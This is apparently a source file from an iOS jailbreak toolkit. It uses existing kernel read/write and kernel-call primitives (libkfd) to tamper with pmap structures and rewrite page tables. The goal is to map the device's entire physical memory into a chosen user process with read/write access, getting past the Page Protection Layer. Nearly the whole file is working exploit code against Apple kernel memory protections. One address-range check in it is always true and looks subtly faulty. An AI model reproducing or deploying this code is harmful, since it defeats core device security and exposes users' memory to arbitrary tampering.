#import "libkfd.h"
#import "pte.h"
#import "boot_info.h"
#import "util.h"
#include "pplrw.h"

#define PERM_KRW_URW 0x7 // R/W for kernel and user
#define FAKE_PHYSPAGE_TO_MAP 0x13370000
#define L2_BLOCK_SIZE 0x2000000
#define L2_BLOCK_PAGECOUNT (L2_BLOCK_SIZE / PAGE_SIZE)
#define L2_BLOCK_MASK (L2_BLOCK_SIZE-1)

#define PPLRW_USER_MAPPING_OFFSET   0x7000000000
#define PPLRW_USER_MAPPING_TTEP_IDX (PPLRW_USER_MAPPING_OFFSET / 0x1000000000)

uint64_t pmap_alloc_page_for_kern(unsigned int options)
{
    return kcall(bootInfo_getSlidUInt64(@"pmap_alloc_page_for_kern"), options, 0,0,0,0,0,0);
}

void pmap_mark_page_as_ppl_page(uint64_t pa)
{
    kcall(bootInfo_getSlidUInt64(@"pmap_mark_page_as_ppl_page"), pa, 0,0,0,0,0,0);
}

void pmap_alloc_page_for_ppl(unsigned int options)
{
    //thread_t self = current_thread();

    //uint16_t thread_options = self->options;
    //self->options |= TH_OPT_VMPRIV;
    uint64_t pa = pmap_alloc_page_for_kern(options);
    //self->options = thread_options;

    if (pa != 0) {
        pmap_mark_page_as_ppl_page(pa);
    }
}

kern_return_t pmap_enter_options_addr(uint64_t pmap, uint64_t pa, uint64_t va) {
    while (1) {
        kern_return_t kr = (kern_return_t)kcall(bootInfo_getSlidUInt64(@"pmap_enter_options_addr"), pmap, va, pa, VM_PROT_READ | VM_PROT_WRITE, 0, 0, 1/*, 1*/);
        if (kr != KERN_RESOURCE_SHORTAGE) {
            return kr;
        }
        else {
            // On resource shortage, alloc new page
            pmap_alloc_page_for_ppl(0);
        }
    }
}

void pmap_remove(uint64_t pmap, uint64_t start, uint64_t end) {
    kcall(bootInfo_getSlidUInt64(@"pmap_remove_options"), pmap, start, end, 0x100, 0, 0, 0/*, 0*/);
}

void pmap_set_type(uint64_t pmap_ptr, uint8_t type)
{
    //uint64_t kernel_el = bootInfo_getUInt64(@"kernel_el");
    //uint32_t el2_adjust = (kernel_el == 8) ? 8 : 0;
    uint8_t buf[4] = { _kread32(kcall_kfd, pmap_ptr + 0xC8) };
    buf[0] = type;
    
    _kwrite32(kcall_kfd, pmap_ptr + 0xC8, *(uint32_t*)(buf));
}

uint64_t rp64(uint64_t addr) {
    uint64_t pa = phystokv( ((struct kfd *)kcall_kfd), addr);
    return _kread64(kcall_kfd, pa);
}

uint64_t pmap_lv2(uint64_t pmap, uint64_t virt) {
    uint64_t ttep = _kread64(kcall_kfd, pmap + 0x8ULL);
    
    uint64_t table1Off   = (virt >> 36ULL) & 0x7ULL;
    
    uint64_t table1Entry = rp64(ttep + (8ULL * table1Off));
    
    if ((table1Entry & 0x3) != 3) {
        return 0;
    }
    
    uint64_t table2 = table1Entry & 0xFFFFFFFFC000ULL;
    uint64_t table2Off = (virt >> 25ULL) & 0x7FFULL;
    uint64_t table2Entry = rp64(table2 + (8ULL * table2Off));
    
    return table2Entry;
}

int pmap_map_in(uint64_t kfd, uint64_t pmap, uint64_t ua, uint64_t pa, uint64_t size)
{
    uint64_t mappingUaddr = ua & ~L2_BLOCK_MASK;
    uint64_t mappingPA = pa & ~L2_BLOCK_MASK;

    uint64_t endPA = pa + size;
    uint64_t mappingEndPA = endPA & ~L2_BLOCK_MASK;

    uint64_t l2Count = ((mappingEndPA - mappingPA) / L2_BLOCK_SIZE) + 1;

    for (uint64_t i = 0; i < l2Count; i++) {
        uint64_t curMappingUaddr = mappingUaddr + (i * L2_BLOCK_SIZE);
        kern_return_t kr = pmap_enter_options_addr(pmap, FAKE_PHYSPAGE_TO_MAP, curMappingUaddr);
        if (kr != KERN_SUCCESS) {
            pmap_remove(pmap, mappingUaddr, curMappingUaddr);
            return -7;
        }
    }

    // Temporarily change pmap type to nested
    pmap_set_type(pmap, 3);
    // Remove mapping (table will not be removed because we changed the pmap type)
    pmap_remove(pmap, mappingUaddr, mappingUaddr + (l2Count * L2_BLOCK_SIZE));
    // Change type back
    pmap_set_type(pmap, 0);

    for (uint64_t i = 0; i < l2Count; i++) {
        uint64_t curMappingUaddr = mappingUaddr + (i * L2_BLOCK_SIZE);
        uint64_t curMappingPA = mappingPA + (i * L2_BLOCK_SIZE);

        // Create full table for this mapping
        uint64_t tableToWrite[2048];
        for (int k = 0; k < 2048; k++) {
            uint64_t curMappingPage = curMappingPA + (k * 0x4000);
            if (curMappingPage >= pa || curMappingPage < (pa + size)) {
                tableToWrite[k] = curMappingPage | PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY;
            }
            else {
                tableToWrite[k] = 0;
            }
        }

        // Replace table with the entries we generated
        uint64_t table2Entry = pmap_lv2(pmap, curMappingUaddr);
        if ((table2Entry & 0x3) == 0x3) {
            uint64_t table3 = table2Entry & 0xFFFFFFFFC000ULL;
            physwritebuf(kfd, table3, tableToWrite, 0x4000);
        }
        else {
            return -6;
        }
    }

    return 0;
}

uint64_t proc_get_task(u64 kfd, uint64_t proc_ptr)
{
    return _kread64(kfd, proc_ptr + 0x10);
}

uint64_t task_get_vm_map(u64 kfd, uint64_t task_ptr)
{
    return _kread64(kfd, task_ptr + 0x28);
}

uint64_t vm_map_get_pmap(u64 kfd, uint64_t vm_map_ptr)
{
    return _kread64(kfd, vm_map_ptr + bootInfo_getUInt64(@"VM_MAP_PMAP"));
}

uint64_t pmap_get_ttep(u64 kfd, uint64_t pmap_ptr)
{
    return _kread64(kfd, pmap_ptr + 0x8);
}

int handoffPPLPrimitives(u64 kfd, pid_t pid)
{
    printf("%s calling in.\n", __func__);
    if (!pid) return -1;

    int ret = 0;

//    bool proc_needs_release = false;
    uint64_t proc = proc_of_pid(kfd, pid);
    if (!proc) {
        printf("%s: failed to get proc.\n", __func__);
        return -1;
    }
    
    printf("we got proc\n");
    
    uint64_t task = proc_get_task(kfd, proc);
    if (!task) {
        printf("%s: failed to get task\n", __func__);
        return -1;
    }
    
    printf("we got task\n");
    
    uint64_t vmMap = task_get_vm_map(kfd, task);
    
    if (!vmMap) {
        printf("%s: failed to get vmMap\n", __func__);
        return -1;
    }
    
    printf("we got vmmap\n");
    uint64_t pmap = vm_map_get_pmap(kfd, vmMap);
    if (!pmap) {
        printf("%s: failed to get pmap\n", __func__);
        return -1;
    }
    
    printf("we got pmap\n");
    uint64_t existingLevel1Entry = _kread64(kfd, pmap_get_ttep(kfd, pmap) + (8 * PPLRW_USER_MAPPING_TTEP_IDX));
    // If there is an existing level 1 entry, we assume the process already has PPLRW primitives
    // Normally there cannot be mappings above 0x3D6000000, so this assumption should always be true
    // If we would try to handoff PPLRW twice, the second time would cause a panic because the mapping already exists
    // So this check protects the device from kernel panics, by not adding the mapping if the process already has it
    if (existingLevel1Entry == 0)
    {
        // Map the entire kernel physical address space into the userland process, starting at PPLRW_USER_MAPPING_OFFSET
//        uint64_t physBase = _kread64(kfd, bootInfo_getSlidUInt64(@"gPhysBase"));
//        uint64_t physSize = _kread64(kfd, bootInfo_getSlidUInt64(@"gPhysSize"));
        printf("%s reached here.\n", __func__);
        uint64_t physBase = ((struct kfd *)kfd)->info.kernel.gPhysBase;
        uint64_t physSize = ((struct kfd *)kfd)->info.kernel.gPhysSize;
        ret = pmap_map_in(kfd, pmap, physBase+PPLRW_USER_MAPPING_OFFSET, physBase, physSize);
    } else {
        printf("existingLevel1Entry is NOT 0!!\n");
    }

    return ret;
}
